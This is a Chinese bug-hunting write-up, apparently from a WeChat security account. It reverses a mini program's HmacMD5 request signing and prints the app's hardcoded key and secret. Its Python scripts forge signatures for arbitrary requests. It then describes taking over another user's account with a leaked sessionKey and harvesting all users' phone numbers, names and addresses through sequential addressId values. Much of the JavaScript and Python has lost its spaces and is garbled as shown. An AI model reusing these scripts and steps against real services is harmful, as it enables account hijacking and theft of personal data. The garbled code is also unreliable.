#  sign加密小程序漏洞挖掘   
eeknight  迪哥讲事   2024-09-03 22:00  
  
## 公众号：安全客资讯平台（ID：anquanbobao）作者：（eeknight）  
## 前言  
  
通过本篇论文，你可以了解两个知识点：  
1. sign加密解密  
  
1. 小程序漏洞挖掘  
  
## 漏洞发现  
  
注册的时候点击一个获取手机号  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdPw9chdeBg7Rkvx1MzFRve0REMcM8MrFNUicAoFtibdo9icd9dTzMq1EvA/640?wx_fmt=png&from=appmsg "")  
  
这里通过burp可以看到微信小程序获取手机号的三个关键参数，decryptData，sessionKey和iv。  
  
正常情况是只有decryptData和iv，如果看到sessionKey基本就是一个任意登录漏洞了。  
  
正常的小程序在获取微信提供的用户数据的时候通过sessionKey来提供甲基咪，这个sessionKey就是会话密钥，可以简单理解为微信开放数据AES加密的密钥，它是微信服务器给开发者服务器颁发的身份凭证，这个数据正常来说是不能通过任何方式泄露出去的。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdFX2iakuAu11FbDqIJKzqHav22e9SaSoHic1KHWHBlX971icibH1bG9ZE6A/640?wx_fmt=png&from=appmsg "")  
  
首先我们通过burp的插件sessionkey crypt解密一下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd9iaNzdeLaAjzhO6B9ZKYq1cmbInAaKoE9wsh5L90atLdT98xQrZtzrQ/640?wx_fmt=png&from=appmsg "")  
  
但是这里存在一个问题，这里存在sign值的验证  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdoHeBhuluP7tjBzdHTt47hB9LV3Ru3zxgqNYf8NJiaOxHVcxQtzaibx6g/640?wx_fmt=png&from=appmsg "")  
  
那现成的漏洞我们拿不到，接下来我们要通过逆向去吧sign的值解密出来，看看加密逻辑然后重新实现。  
## sign解密  
### 减法操作  
  
在测试加密的时候，首先要做减法，看看影响sign的参数有哪些。  
  
首先发送一个正常数据包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdMY8unDqGPe6ssarbyFjf37e7mdzOzsic9jJlMx44EibUnn4Ls4sYKHIQ/640?wx_fmt=png&from=appmsg "")  
  
现在可以发送，我一点点减少  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdib0XtKIicZZcyW5yRiauoypcHwC4F3YAVbvTJdKbT1JFSiaibElELRaWz1A/640?wx_fmt=png&from=appmsg "")  
  
如果再减少一行的话（我这里删除了App_type: 3，不管是哪一个都是这样），会出现”公共请求Head参数缺失。”  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdCl6NKwIO4bibavld7gfampj72kUBIhMfaXYRT3kBBgwvcDibt4uwrwUQ/640?wx_fmt=png&from=appmsg "")  
  
这里可以思考一下，还可以减少吗？  
  
其实是可以的，我们刚才减少的是参数，如果我不去参数，我去掉参数的值呢，某一些参数是可以删除的，这里通过这个，我们可以进一步判断sign的影响值是哪个。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdWsUalZvRjj5ZKQ2iaD2juYuwMYOOHibFUCicZuENwvoab7RbWZe6DKCEA/640?wx_fmt=png&from=appmsg "")  
  
现在我们可以判断，影响sign的值有key，Timestamp和数据包。  
  
接下来我们再少一点，找一个没有传输数据的数据包做测试。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdmEtib1slLGlvwOyckPiawNBtV5iaialkMloicIe7zFBNzs95CtTjhtZ07iaQ/640?wx_fmt=png&from=appmsg "")  
  
这里的影响就只有key和sign了。  
### 反汇编  
  
找到减法了，接下里就是小程序反汇编，首先这里的sign是32为，很想md5，小程序反汇编后直接找关键词，md5，sign，encode等等。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd9pBad6fDsOBsjEbibV3aSRAQ7Yf6Hq9JLEs58bV7XGpYRzgfmzceWpw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdYFFiclv3icylsCMibPqtbfeTU2Friaaj3Wk5GTDQPBCJiaXmetmE1CLibxqg/640?wx_fmt=png&from=appmsg "")  
  
在md5的时候看到一个sign加密，而且还是用HmacMD5的，看一下这个代码。  
  
…..  
  
sign: function(e, t, n) {  
  
varr=n(“7123”),  
  
o=n(“8664”);  
  
n(“5622”),  
  
n(“3524”);  
  
vari=”B272F43387B8504C”,  
  
a=”weixin”,  
  
s=”70BAE8B491362AB39042B77C7653199D”;  
  
functionu(e, t) {  
  
returnt.key<e.key?-1 : t.key>e.key?1 : 0  
  
}  
  
e.exports= {  
  
signRequest: function(e) {  
  
e=e|| {};  
  
vart= {},  
  
n= (newDate).valueOf() +6e4;  
  
t.timestamp=n,  
  
t.key=i,  
  
t.app_type=3,  
  
t.OS_type=3,  
  
t.device_id=a,  
  
o.HmacMD5(s, n+””).toString(o.enc.Hex).substring(8, 24).toUpperCase();  
  
varc= [],  
  
l=”object”===r(e) &&”number”==typeofe.length;  
  
for (varfine) {  
  
vard=f;  
  
l&& (d=e[f].key),  
  
l?c.push(e[f]) : “object”===r(e[d]) ||c.push({  
  
key: d,  
  
value: e[d]  
  
})  
  
}  
  
c.push({  
  
key: “timestamp”,  
  
value: n  
  
}),  
  
c.push({  
  
key: “key”,  
  
value: i  
  
}),  
  
c=c.sort(u);  
  
varh=””;  
  
for (varfinc) if ((d=c[f]).valueinstanceofArray) for (varpind.value) {  
  
varg=d.value[p];  
  
h+=d.key,  
  
h+=g  
  
} elseh+=d.key,  
  
h+=d.value;  
  
varv=o.HmacMD5(h+s, n+””).toString().toUpperCase();  
  
returnt.sign=v,  
  
t  
  
},  
  
test: function() {  
  
o.HmacMD5(“timestamp1555661061471searchType2keyB272F43387B8504C70BAE8B491362AB39042B77C7653199D”, “1555661061471”).toString().toUpperCase()  
  
}  
  
}  
  
},  
  
…..  
  
这里有一个误导的趋势，下面的demo函数里面有一个测试值，我们可以看到  
  
varv=o.HmacMD5(h+s, n+””).toString().toUpperCase();  
  
这里是用h和s，用n作为秘钥加密的，s是secret的值，是固定的s = “70BAE8B491362AB39042B77C7653199D”;  
  
h前面的说法是h += d.value;也就是d的值相加  
  
c.push({  
  
key: “timestamp”,  
  
value: n  
  
  }),  
  
c.push({  
  
key: “key”,  
  
value: i  
  
  }),  
  
c=c.sort(u);  
  
varh=””;  
  
for (varfinc) if ((d=c[f]).valueinstanceofArray) for (varpind.value) {  
  
varg=d.value[p];  
  
h+=d.key,  
  
h+=g  
  
} elseh+=d.key,  
  
h+=d.value;  
  
我们看到key和timestamp，结合我们刚才的无参数的值，再看看demo里面的  
  
o.HmacMD5(“timestamp1555661061471searchType2keyB272F43387B8504C70BAE8B491362AB39042B77C7653199D”, “1555661061471”).toString().toUpperCase()  
  
HmacMD5(timestamp+timestamp的值+searchType2[不知道干什么用的]+key+key的值+secret)再用时间戳作为秘钥  
  
这里的误区就是searchType2，刚开始我以为他有用，发现死活加密不出来，后面不用这个值，直接加密发现就可以了。  
  
无传输数据的数据包  
  
Os_type:  
  
App_type:  
  
Device_id:  
  
Key: B272F43387B8504C  
  
Sign: 73A8C93DC2A4CA79A8897879DDF54EA7  
  
Content-Type: application/x-www-form-urlencoded  
  
Timestamp: 1719387012630  
  
Connection: close  
  
Content-Length: 2  
  
{}  
  
加密脚本  
  
importhmac  
  
importhashlib  
  
key = “B272F43387B8504C”;  
  
timestamp = 1719387012630;  
  
timestamp = str(timestamp)  
  
secret = “70BAE8B491362AB39042B77C7653199D”;  
  
str1 = ‘timestamp’+timestamp+’key’+key+secret  
  
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)  
  
mac.digest()  
  
str_encode = mac.hexdigest().upper()  
  
print(str_encode)  
  
# 73A8C93DC2A4CA79A8897879DDF54EA7  
  
首次加密没问题了，接下来是有参数的，我找了一个只有一个参数的  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd7uBJL3FuIhYbVicYkZ5yYqAOG6icIE1fxVEuXAibX7hBUIT2JJBw19YQg/640?wx_fmt=png&from=appmsg "")  
  
刚才是直接拼接，再仔细看一下有一个排序操作c = c.sort(u);，从demo的timestamp—>searchType—>key，想着会不会是以ZYXWVUTSRQPONMLKJIHGFEDCBA排序，按这个思路，我把addressCode放到key的前面加密  
  
Os_type:  
  
App_type:  
  
Device_id:  
  
Key: B272F43387B8504C  
  
Sign: 285F822334E8978E25D92D8975A3479C  
  
Content-Type: application/x-www-form-urlencoded  
  
Timestamp: 1719387013084  
  
Connection: close  
  
Content-Length: 13  
  
addressCode=2  
  
输出脚本  
  
importhmac  
  
importhashlib  
  
key = “B272F43387B8504C”;  
  
timestamp = 1719387013084;  
  
timestamp = str(timestamp)  
  
secret = “70BAE8B491362AB39042B77C7653199D”;  
  
addressCode = “2”  
  
str1 = ‘timestamp’+timestamp+’key’+key+”addressCode”+addressCode+secret  
  
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)  
  
mac.digest()  
  
str_encode = mac.hexdigest().upper()  
  
print(str_encode)  
  
# 285F822334E8978E25D92D8975A3479C  
  
所以思路就是把所有参数按字母排序然后加密出来，对于多个参数，这里是通过键值对的反思。  
  
for (var f in c) if ((d = c[f]).value instanceof Array) for (var p in d.value) {  
  
  var g = d.value[p];  
  
  h += d.key,  
  
  h += g  
  
}  
  
把数据包的按=号前后提取分配，回到sessionkey来，测试sign的加密方式，这里在测试的时候发现直接进行url解密的时候会出现报错。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd92EHQvaejXWAlYBHT6tp55LUtTe3XQ5xw6WhNe9iarbuFaJTLLzuHMg/640?wx_fmt=png&from=appmsg "")  
  
在处理加密的逻辑的时候，先按前面逻辑处理一下  
  
Content-Length: 318  
  
Os_type:  
  
Key: B272F43387B8504C  
  
Sign: 03E03380485A6FE4BA9FFFD0AE555C42  
  
Device_id:  
  
Content-Type: application/x-www-form-urlencoded  
  
App_type:  
  
Timestamp: 1719387015597  
  
Connection: close  
  
decryptData=lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ%3D%3D&sessionKey=sRfHDswxxxxxxxxxxxx%3D%3D&iv=RpwxxxxxxxxxxxxzPQyTA%3D%3D  
  
importhmac  
  
importhashlib  
  
key = “B272F43387B8504C”;  
  
timestamp = 1719387015597;  
  
timestamp = str(timestamp)  
  
secret = “70BAE8B491362AB39042B77C7653199D”;  
  
decryptData = “lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ”  
  
sessionKey = “sRfHDswxxxxxxxxxxxx%3D%3D”  
  
iv = “RpwxxxxxxxxxxxxzPQyTA%3D%3D”  
  
str1 = ‘timestamp’+timestamp+’sessionKey’+sessionKey+’key’+key+’iv’+iv+”decryptData”+decryptData+secret  
  
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)  
  
mac.digest()  
  
str_encode = mac.hexdigest().upper()  
  
print(str_encode)  
  
#EEDB56B05B83B1A2D1660509F6387A06  
  
这里是思考为什么报错，然后想着会不会是url解码问题，我在处理sign加密的时候加一个url解码，发现就可以了  
  
importhmac  
  
importhashlib  
  
importurllib.parse  
  
fromurllib.parseimportunquote  
  
key = “B272F43387B8504C”;  
  
timestamp = 1719387015597;  
  
timestamp = str(timestamp)  
  
secret = “70BAE8B491362AB39042B77C7653199D”;  
  
decryptData = “lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ”  
  
sessionKey = “sRfHDswxxxxxxxxxxxx%3D%3D”  
  
iv = “RpwxxxxxxxxxxxxzPQyTA%3D%3D”  
  
str1 = ‘timestamp’+timestamp+’sessionKey’+urllib.parse.unquote(sessionKey) +’key’+key+’iv’+urllib.parse.unquote(iv) +”decryptData”+urllib.parse.unquote(decryptData) +secret  
  
mac = hmac.new(key=timestamp.encode(), msg=str1.encode(),digestmod=hashlib.md5)  
  
mac.digest()  
  
str_encode = mac.hexdigest().upper()  
  
print(str_encode)  
  
#03E03380485A6FE4BA9FFFD0AE555C42  
  
现在sign值已经解密出来了，这样一步步写太麻烦了，就改进一下脚本。  
  
importhmac  
  
importhashlib  
  
importurllib.parse  
  
fromurllib.parseimportunquote  
  
request_data = f”””  
  
Content-Length: 318  
  
Os_type:  
  
Key: B272F43387B8504C  
  
Sign: 03E03380485A6FE4BA9FFFD0AE555C42  
  
Device_id:  
  
Content-Type: application/x-www-form-urlencoded  
  
App_type:  
  
Timestamp: 1719387015597  
  
Connection: close  
  
decryptData=lGtijwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxwxxxxxxxxxxxxWYPYgR6HiHFQmMYV0uOQ%3D%3D&sessionKey=sRfHDswxxxxxxxxxxxx%3D%3D&iv=RpwxxxxxxxxxxxxzPQyTA%3D%3D  
  
“””  
  
params = request_data.split(‘\n’)  
  
formatted_output = {“key”: “B272F43387B8504C”}  
  
foriteminparams:  
  
ifitem.startswith(‘Timestamp: ‘):  
  
timestamp_value = item.split(‘Timestamp: ‘)[1]  
  
formatted_output[‘timestamp’] = timestamp_value  
  
timestamp = timestamp_value  
  
datas = params[-2]  
  
params_list = datas.split(‘&’)  
  
forparaminparams_list:  
  
key, value = param.split(‘=’, 1)  
  
value = urllib.parse.unquote(value)  
  
formatted_output[key] = value  
  
str1 = []  
  
forkey, valueinformatted_output.items():  
  
str1.append(key+value)  
  
sorted_str1 = sorted(str1, key=lambdas: s[0])  
  
str2 = “”  
  
forvainsorted_str1[::-1]:  
  
str2 += va  
  
str2 += “70BAE8B491362AB39042B77C7653199D”  
  
mac = hmac.new(key=timestamp.encode(), msg=str2.encode(),digestmod=hashlib.md5)  
  
mac.digest()  
  
str_encode = mac.hexdigest().upper()  
  
print(str_encode)  
  
这里给出数据包，就自动提取参数，然后加密。  
## 再次挖掘  
### 用户接管漏洞  
  
现在sign有了，我们最开始的任意用户绑定登录就可以拿下了。使用两个账号，实现一个正常用户登录，另一个攻击者来接管这个账号。  
  
正常用户注册登录如下  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd8K1Ll1S79TJqncdYyoMv1Enf4kToRVAicuKQcAvFiaoKOsklam7DDiagQ/640?wx_fmt=png&from=appmsg "")  
  
攻击者在获取手机号的时候截取数据包。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd6pRs20RsCrzb94cEhXm9YO9ffln5qF7hLY9DJU2Cm3UQT5nxz068NQ/640?wx_fmt=png&from=appmsg "")  
  
通过sessionkey来修改登录的数据包，然后通过脚本生成sign缀  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdm2Dgr7xHF6uYEZdwFtpZHibgicLMMcOzHibL3vdic6qSbLGN0y3VdfEv2A/640?wx_fmt=png&from=appmsg "")  
  
然后登录，可以直接接管正常用户的数据。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd5CQicCo4MPviaLEykbhzmxblXTJYk4FvWuf8eC0QYLE45de2Mm4qtPpw/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd6Dtte3bXKAUzJPF654icicvznd55h90QaTgdgBzcbBQNibYGJhXLotB7Q/640?wx_fmt=png&from=appmsg "")  
  
可以看到我现在不是19开头的，但是我可以登录19的账号，实现接管，并修改账号名。  
### 信息泄露  
  
除此之外，有了sign值，可以看一下其他漏洞，这里还发现了一个用户信息泄露（图片比较模糊，重点是提供一个思路）。  
  
在购物车下订单，我们可以获取订单信息，这里是生成订单的时候有一个addressId，假设我们可以获取别人的值，是不是可以造成别人的敏感信息泄露，手机号，姓名，家庭地址。  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdpdYtkiaIwNDvpr4VzSdL1vcicHYGtHiaOzicHvyN6nQibI0wtWKv8ibz1WSg/640?wx_fmt=png&from=appmsg "")  
  
在这里我们生成订单，然后不要支付，点击我的订单然后抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrdyyM3ECzf312QADXakSJ8FJUkPOQtG0WOOLI1YTCPe7jzbT4v7M9Keg/640?wx_fmt=png&from=appmsg "")  
  
查看订单然后抓包  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj44icovdfEaXAsNWhqOYuibrd85JBnnJ6HbDwtkKfR9PCTSDfNrVh8Jiaxpmq3kiaC1wic8e6ghkuWibbcw/640?wx_fmt=png&from=appmsg "")  
  
这里可以看到别人的订单信息了，这里的addressId是按顺序生成的，所以可以看到所有人的敏感信息，但是由于限制了订单，所以我们要先下单—修改id—查看信息—取消—下单这样循环才可以看到全站人的信息。这里写一个脚本处理其实就可以了，sign的获取通过配合前面的脚本，然后生成就好了。  
  
这个小程序的漏洞就看了两个，主要就是一个sign的加密解密逻辑和小程序漏洞挖掘而已，如果有说的不对的，恳请各位师傅们批评指正！！！  
  
![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5jYW8icFkojHqg2WTWTjAnvcuF7qGrj3JLz1VgSFDDMOx0DbKjsia5ibMpeISsibYJ0ib1d2glMk2hySA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1 "")  
  
## 往期回顾  
  
  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486912&idx=1&sn=8704ce12dedf32923c6af49f1b139470&chksm=e8a607a3dfd18eb5abc302a40da024dbd6ada779267e31c20a0fe7bbc75a5947f19ba43db9c7&scene=21#wechat_redirect)  
  
[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)  
  
  
[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
[](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)  
  
  
[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)  
  
  
[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)  
  
  
安全客：有思想的安全新媒体。  
声明：本文经安全客授权发布，转载请联系安全客平台。  
  
